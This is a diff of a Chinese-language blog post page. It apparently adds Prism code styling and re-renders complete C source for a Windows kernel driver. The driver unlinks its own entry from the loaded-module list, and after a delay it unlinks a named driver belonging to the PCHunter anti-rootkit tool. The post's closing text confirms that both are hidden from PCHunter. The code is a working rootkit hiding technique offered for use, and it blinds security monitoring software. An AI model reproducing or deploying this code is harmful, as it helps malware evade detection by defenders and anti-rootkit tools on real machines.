@@ -21,7 +21,8 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 <body id="bodyx">
     <div class="hd posts">
     <a href="/index.html"><i class="fa fa-home
@@ -34,8 +35,132 @@
     </div>
     <div class="post-content">
         <p>相比与上一篇文章，这篇增加了对于任意驱动的断链的功能</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> POBJECT_TYPE *IoDriverObjectType;</span><br><span class="line"></span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">ObReferenceObjectByName</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PUNICODE_STRING ObjectName,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in ULONG Attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in_opt PACCESS_STATE AccessState,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in_opt ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in POBJECT_TYPE ObjectType,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">    __inout_opt PVOID ParseContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    __out PVOID* Object</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NON_PAGED_DEBUG_INFO</span> &#123;</span></span><br><span class="line">    USHORT      Signature;</span><br><span class="line">    USHORT      Flags;</span><br><span class="line">    ULONG       Size;</span><br><span class="line">    USHORT      Machine;</span><br><span class="line">    USHORT      Characteristics;</span><br><span class="line">    ULONG       TimeDateStamp;</span><br><span class="line">    ULONG       CheckSum;</span><br><span class="line">    ULONG       SizeOfImage;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">&#125; NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    PVOID ExceptionTable;</span><br><span class="line">    ULONG ExceptionTableSize;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID GpValue;</span><br><span class="line">    PNON_PAGED_DEBUG_INFO NonPagedDebugInfo;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT __Unused5;</span><br><span class="line">    PVOID SectionPointer;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID LoadedImports;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Unloaded !!!\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">BreakMyLink</span><span class="params">(PVOID pContent)</span>  <span class="comment">//将自身摘链</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER large = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    large.QuadPart = <span class="number">-10000</span> * <span class="number">1000</span>;   <span class="comment">//1ske</span></span><br><span class="line">    KeDelayExecutionThread(KernelMode, TRUE, &amp;large);</span><br><span class="line">    PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    pDriver-&gt;DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">    RemoveEntryList(myLink);</span><br><span class="line">    pDriver-&gt;Type = <span class="number">0</span>;</span><br><span class="line">    pDriver-&gt;DriverInit = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">ListAllDriver</span><span class="params">(PDRIVER_OBJECT pDriver)</span>  <span class="comment">//使用链表遍历驱动</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextHeader = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader-&gt;InLoadOrderLinks.Flink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nextHeader != nextList)</span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;%wZ\r\n&quot;</span>,&amp;nextList-&gt;FullDllName));</span><br><span class="line">        nextList = (PKLDR_DATA_TABLE_ENTRY)nextList-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BreakLinkByName</span><span class="params">(PWCHAR objName)</span>  <span class="comment">//通过驱动名断链驱动</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UNICODE_STRING DriverName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    RtlInitUnicodeString(&amp;DriverName, objName);</span><br><span class="line">    PDRIVER_OBJECT pDriver = <span class="literal">NULL</span>;</span><br><span class="line">    LARGE_INTEGER large = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    large.QuadPart = <span class="number">-10000</span> * <span class="number">5000</span>;   <span class="comment">//5s</span></span><br><span class="line">    KeDelayExecutionThread(KernelMode, TRUE, &amp;large);</span><br><span class="line">    NTSTATUS status =  ObReferenceObjectByName(&amp;DriverName,FILE_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,*IoDriverObjectType,KernelMode,<span class="literal">NULL</span>,&amp;pDriver);</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(status)) </span><br><span class="line">    &#123;</span><br><span class="line">        PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">        pDriver-&gt;DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">        RemoveEntryList(myLink);</span><br><span class="line">        pDriver-&gt;Type = <span class="number">0</span>;</span><br><span class="line">        pDriver-&gt;DriverInit = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ObDereferenceObject(pDriver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(ListAllDriver(pDriver))) </span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;List All Drivers Success\r\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//BreakLinkByName(L&quot;\\driver\\PCHunter32as&quot;);</span></span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PsCreateSystemThread(&amp;hThread,THREAD_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,BreakMyLink,pDriver);</span><br><span class="line">    PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, BreakLinkByName, <span class="string">L&quot;\\driver\\PCHunter32as&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Loaded !!!\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-C"><code class="language-C">#include <ntifs.h>
 
+extern POBJECT_TYPE *IoDriverObjectType;
+
+NTKERNELAPI NTSTATUS ObReferenceObjectByName(
+    __in PUNICODE_STRING ObjectName,
+    __in ULONG Attributes,
+    __in_opt PACCESS_STATE AccessState,
+    __in_opt ACCESS_MASK DesiredAccess,
+    __in POBJECT_TYPE ObjectType,
+    __in KPROCESSOR_MODE AccessMode,
+    __inout_opt PVOID ParseContext,
+    __out PVOID* Object
+);
+
+
+typedef struct _NON_PAGED_DEBUG_INFO &#123;
+    USHORT      Signature;
+    USHORT      Flags;
+    ULONG       Size;
+    USHORT      Machine;
+    USHORT      Characteristics;
+    ULONG       TimeDateStamp;
+    ULONG       CheckSum;
+    ULONG       SizeOfImage;
+    ULONGLONG   ImageBase;
+&#125; NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO;
+
+typedef struct _KLDR_DATA_TABLE_ENTRY &#123;
+    LIST_ENTRY InLoadOrderLinks;
+    PVOID ExceptionTable;
+    ULONG ExceptionTableSize;
+    // ULONG padding on IA64
+    PVOID GpValue;
+    PNON_PAGED_DEBUG_INFO NonPagedDebugInfo;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    USHORT LoadCount;
+    USHORT __Unused5;
+    PVOID SectionPointer;
+    ULONG CheckSum;
+    // ULONG padding on IA64
+    PVOID LoadedImports;
+    PVOID PatchInformation;
+&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;
+
+
+VOID DriverUnload(PDRIVER_OBJECT pDriver) 
+&#123;
+    KdPrint(("Driver Unloaded !!!\r\n"));
+&#125;
+
+
+VOID BreakMyLink(PVOID pContent)  //将自身摘链
+&#123;
+    LARGE_INTEGER large = &#123; 0 &#125;;
+    large.QuadPart = -10000 * 1000;   //1ske
+    KeDelayExecutionThread(KernelMode, TRUE, &large);
+    PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent;
+    PKLDR_DATA_TABLE_ENTRY myLink = &((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks;
+    pDriver->DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks.Flink;
+    RemoveEntryList(myLink);
+    pDriver->Type = 0;
+    pDriver->DriverInit = 0;
+&#125;
+
+
+NTSTATUS ListAllDriver(PDRIVER_OBJECT pDriver)  //使用链表遍历驱动
+&#123;
+    PKLDR_DATA_TABLE_ENTRY nextHeader = &((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks;
+    PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader->InLoadOrderLinks.Flink;
+
+    while (nextHeader != nextList)
+    &#123;
+        KdPrint(("%wZ\r\n",&nextList->FullDllName));
+        nextList = (PKLDR_DATA_TABLE_ENTRY)nextList->InLoadOrderLinks.Flink;
+    &#125;
+    return STATUS_SUCCESS;
+&#125;
+
+void BreakLinkByName(PWCHAR objName)  //通过驱动名断链驱动
+&#123;
+    UNICODE_STRING DriverName = &#123; 0 &#125;;
+    RtlInitUnicodeString(&DriverName, objName);
+    PDRIVER_OBJECT pDriver = NULL;
+    LARGE_INTEGER large = &#123; 0 &#125;;
+    large.QuadPart = -10000 * 5000;   //5s
+    KeDelayExecutionThread(KernelMode, TRUE, &large);
+    NTSTATUS status =  ObReferenceObjectByName(&DriverName,FILE_ALL_ACCESS,NULL,NULL,*IoDriverObjectType,KernelMode,NULL,&pDriver);
+    if (NT_SUCCESS(status)) 
+    &#123;
+        PKLDR_DATA_TABLE_ENTRY myLink = &((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks;
+        pDriver->DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection)->InLoadOrderLinks.Flink;
+        RemoveEntryList(myLink);
+        pDriver->Type = 0;
+        pDriver->DriverInit = 0;
+        
+        ObDereferenceObject(pDriver);
+    &#125;
+&#125;
+
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) 
+&#123;
+    
+    if (NT_SUCCESS(ListAllDriver(pDriver))) 
+    &#123;
+        KdPrint(("List All Drivers Success\r\n"));
+    &#125;
+
+    //BreakLinkByName(L"\\driver\\PCHunter32as");
+
+    HANDLE hThread = NULL;
+    PsCreateSystemThread(&hThread,THREAD_ALL_ACCESS,NULL,NULL,NULL,BreakMyLink,pDriver);
+    PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BreakLinkByName, L"\\driver\\PCHunter32as");
+
+    pDriver->DriverUnload = DriverUnload;
+    KdPrint(("Driver Loaded !!!\r\n"));
+
+    return STATUS_SUCCESS;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>驱动加载前，先打开PCHUNTER，可以看到PCHUNTER自身驱动：<br><img src="/2021/07/07/breaklink-more/before_breaklink.png" alt="image.png"></p>
 <p>驱动断链后，首先隐藏了自身的驱动加载，其次隐藏了PCHUNTER的驱动：<br><img src="/2021/07/07/breaklink-more/after_breaklink.png" alt="image.png"><br>```</p>
 
